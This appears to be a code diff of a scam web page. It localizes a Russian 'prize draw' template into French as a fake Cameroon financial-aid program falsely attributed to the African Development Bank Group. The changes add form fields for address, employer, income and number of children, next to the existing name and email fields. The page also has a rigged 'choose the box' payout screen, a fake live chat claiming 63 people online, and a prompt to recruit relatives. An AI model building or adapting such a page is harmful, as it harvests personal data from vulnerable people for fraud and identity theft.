@@ -8,7 +8,7 @@
   <link rel="apple-touch-icon" href="logo192.png">
   <link rel="manifest" href="manifest.json">
   <script src="jquery.js"></script>
-  <title>Розыгрыш призов</title>
+  <title>Aide financière</title>
   <link href="static/css/main.ab7854b3.chunk.css" rel="stylesheet">
   <link rel="stylesheet" href="static/css/style.css">
 </head>
@@ -26,13 +26,12 @@
         <div class="modalfade1" id="modal1">
           <div class="modal2">
             <div class="modalcontent"><img alt="img" src="static/media/hi.638d872d.gif">
-              <p><strong>Получи финансовую помощь по программе поддержки Камеруна</strong></p>
-              <p>На этом сайте вы можете получить финансовую помощь от "African development bank group" в размере от 1000$ до 2000$. Для этого вам нужно ответить на несколько вопросов.</p>
-              <p><strong>Перед тем как ответить на вопросы, укажите свое имя и Email</strong></p>
-              <input id="name" type="text" placeholder="Введите Ваше имя"><br>
-              <input id="email" type="email" placeholder="Введите Ваш Email"><br>
+              <p><strong>Obtenir une aide financière dans le cadre du programme d'appui africain</strong></p>
+              <p>Sur ce site, vous pouvez obtenir une aide financière du "African development bank group" de 1 000 $ à 2 000 dollars.Pour ce faire, vous devez répondre à quelques questions.</p>
+              <p><strong>Avant de répondre aux questions, entrez votre nom.</strong></p>
+              <input id="name" type="text" placeholder="Entrez votre nom"><br>
               <button class="modalbutton">
-                <p>Узнать финансовую помощь</p>
+                <p>Apprendre l'aide financière</p>
               </button>
             </div>
           </div>
@@ -40,10 +39,10 @@
         <div class="modalfade" id="modal4">
           <div class="modal2">
             <div class="modalcontent"><img alt="img" src="static/media/win.4c1de6a3.gif">
-              <p><strong>Поздравляем!!!</strong></p>
-              <p class="winp">Ваша финансовая помощь составила:</p><span id="out" class="out-num"></span><span
+              <p><strong>Toutes nos félicitations !!!</strong></p>
+              <p class="winp">Votre aide financière était la suivante:</p><span id="out" class="out-num"></span><span
                 class="out-num">$</span><br><button class="modalbutton" id="buttonwin">
-                <p>Получить финансовую помощь</p>
+                <p>Obtenir une aide financière</p>
               </button>
             </div>
           </div>
@@ -51,10 +50,10 @@
         <div class="modalfade" id="modal5">
           <div class="modal2">
             <div class="modalcontent"><img src="static/media/hi.638d872d.gif">
-              <p><strong><span id="name1"></span>, с возвращением!</strong></p>
-              <p>Выберите правильную коробку, не упустите свой шанс.</p>
-              <p>У Вас осталось <strong><span id="gg"></span></strong></p><button class="modalbutton">
-                <p>Попробовать ещё раз</p>
+              <p><strong><span id="name1"></span>, content de te revoir!</strong></p>
+              <p>Choisissez la bonne boîte, ne manquez pas votre chance.</p>
+              <p>Tu as quitté <strong><span id="gg"></span></strong></p><button class="modalbutton">
+                <p>Réessayer</p>
               </button>
             </div>
           </div>
@@ -62,55 +61,67 @@
         <div class="modalfade" id="modal7">
           <div class="modal2">
             <div class="modalcontent"><img src="static/media/hi.638d872d.gif">
-              <p><strong><span class="user-name"></span>, с возвращением!</strong></p>
-              <p>Вы уже заполняли форму. Ваша финансовая помощь составила <span class="user-money"></span>.</p>
-              <p>Повторное участие в программе запрещено! Нажмите на кнопку ниже чтобы получить финансовую помощь</p>
+              <p><strong><span class="user-name"></span>, content de te revoir!</strong></p>
+              <p>Vous avez déjà rempli le formulaire.Votre aide financière était <span class="user-money"></span>.</p>
+              <p>La participation répétée au programme est interdite!Cliquez sur le bouton ci-dessous pour recevoir une assistance financière.</p>
               <button class="modalbutton">
-                <p>Получить финансовую помощь</p>
+                <p>Obtenir une aide financière</p>
               </button>
             </div>
           </div>
         </div>
         <div class="header">
-          <p>Финансовая помощь по программе поддержки Камеруна</p>
+          <p>Assistance financière au programme de soutien au Cameroun</p>
         </div>
         <div class="main">
           <div class="textbox">
             <div class="textleft">
-              <p class="goodluck">Не забудьте рассказать о программе помощи вашим родственникам и друзьям!</p>
+              <p class="goodluck">N'oubliez pas de parler du programme d'aider vos proches et vos amis.!</p>
             </div>
             <div class="textright">
-              <p id="tine">3 июня 2021</p>
+              <p id="tine"></p>
             </div>
           </div>
           <div class="main__form">
             <form action="#" class="main__form__body">
               <div class="input">
-                <label for="input">Укажите полное имя!</label>
-                <input name="input" type="text" id="input-name" class="main-input" placeholder="ФИО" required>
+                <label for="input">Spécifiez le nom complet!</label>
+                <input name="input" type="text" id="input-name" class="main-input" placeholder="Ton nom complet" required>
               </div>
               <div class="input">
-                <label for="input">Укажите электронную почту!</label>
-                <input type="email" id="input-email" class="main-input" placeholder="Email" required>
+                <label for="input">Spécifier le courrier électronique!</label>
+                <input type="email" id="input-email" class="main-input" placeholder="Votre email" required>
               </div>
               <div class="input">
-                <label for="input">Укажите сколько у вас детей!</label>
-                <input type="number" id="input-child" class="main-input" placeholder="Сколько детей" required>
+                <label for="input">Spécifiez où vous vivez</label>
+                <input type="text" id="input-address" class="main-input" placeholder="Où habites-tu?" required>
               </div>
-              <button type="submit" class="main-btn">Получить выплаты</button>
+              <div class="input">
+                <label for="input">Spécifiez qui et où vous travaillez!</label>
+                <textarea id="input-work" class="main-input" placeholder="Qui et où travailles-tu?" required></textarea>
+              </div>
+              <div class="input">
+                <label for="input">Spécifiez combien vous gagnez!</label>
+                <input type="text" id="input-salary" class="main-input" placeholder="Quels sont vos revenus?" required>
+              </div>
+              <div class="input">
+                <label for="input">Indiquez combien d'enfants avez-vous!</label>
+                <input type="text" id="input-child" class="main-input" placeholder="Combien d'enfants avez-vous?" required>
+              </div>
+              <button type="submit" class="main-btn">Obtenir des paiements</button>
             </form>
           </div>
-          <p class="onlyone">*Принять участие в акции можно только 1 раз</p>
+          <p class="onlyone">* Vous pouvez participer à la promotion seulement 1 fois</p>
         </div>
         <div class="chat">
           <div class="chatheader"><img class="chatlogo"
               src="data:image/png;base64,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"><span>Онлайн
-              Чат<div class="chattext">Сейчас онлайн: <b class="vbronline">63 человека</b></div></span></div>
+              Discuter<div class="chattext">Maintenant en ligne: <b class="vbronline">63 personnes</b></div></span></div>
           <div class="charcontent messages" id="msg33">
           </div>
           <div class="addmsgchatvbr">
             <div class="jhefjerfk"><input type="text" id="sent" class="inptvbr inputVBRSC"
-                placeholder="Напишите сообщение...">
+                placeholder="Écrire un message...">
               <!-- <div class="chaticons"><img class="chatimg"
                   src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAAyVBMVEVHcExVbXlWb3tUbnpmZmZUbnpUbnpTbnlUbnpUbnpVgIBTcX1UbntDoEdUbnru7u4ptvZPw/eB1PpMr1Bmu2r/8XaA1Pk+vfd20Prl5+hNwvf0735IwfdpzPlQsVd+0vFIpl/A4aBEo0tpvn1IqkxTtGe9xcllv6NUxfh6z+NfyfhzyLQwuPd2zNdxx8tcuJFlfIdrgYtsxLxDwPdXs39JsqNkyehxxaVpxKxatl5+0/pBvOdnvG5huWW7xMhSrnRHo1JLvt4uuPadz7rbAAAADXRSTlMAKii7Bfz7j9TzBiu5Fi0zygAAAn9JREFUaN7tmVlzokAURk1ixMxM67AEEBAVRok67lti9vz/HzXdDbK2VrCvVfPQ50XpKr7DvXS/XCoVgUAgEADzU6rfNTi5q0tXR+J/SLcNEG6lKjP/pgHGDcsgNQCRGP0n/ZkPWk1OWoMFDqpdMwuYc8dTxZxZQh2vDpogvOGoekFA9mcLRtAiu7UgIK+mCQTJEgI+we8zEQIhSASOZTnGV/bmL4Ou/s1lPvdsu/dZViBTjHSQYYWLlpHNt+8x9vNZAnlFnlqmtazkmFVa0Lun9M4THLAMI32ZqsGwQ4FtcAkKPkc+1HUQyI4jWw6QIF3XoUXhEqyAsg1f8vZiAnlLtmmUX16w6XY3JWSlBRuE2VxO8OkRgTfZ7832Qxzy0DazC+cLuojS7SiKsh9FGW0los0joA85QxEzGjgakUVTiTFzxeCrbwvI/VMUM1VY6OY+/BNWN8JXZQSdbiKgTToFqYP8lhGsUYq18j1KCJYowzLdmqDfD3ROwfAjK/gYJimPKuaRT6C/oxzv8SMPXSJwJ1yCABUIooxOX6X0OzwCryjwokcO1Igg9VbGvj/WywgQQxDu1akak5yOsYYZcwrCA31oUKZJwxcieBlyCjxyoGdqilnUIF+j+DpnBfhAL9UM4enYaRE7XgFau1mBS07HRIuZ8ArQn6xAXetKx08EPrcA5QT4QO+0FPwCLydwxxqsoNAkF1pQMDxBC/JNUl+BBSebBCI4ZYARFPbqE7SgsFdfgQXHmwQlONokMc75zwUXHwoCjjUHzLEmGcwuYAazC+Zg9oqOlt8uN1q++HC8UgUc7/9ifkCoSjWY+Br7AwV5DzCfWK7FxyqBQCCA5h8lLVyeSWXn3gAAAABJRU5ErkJggg=="><img
                   class="chatimg"
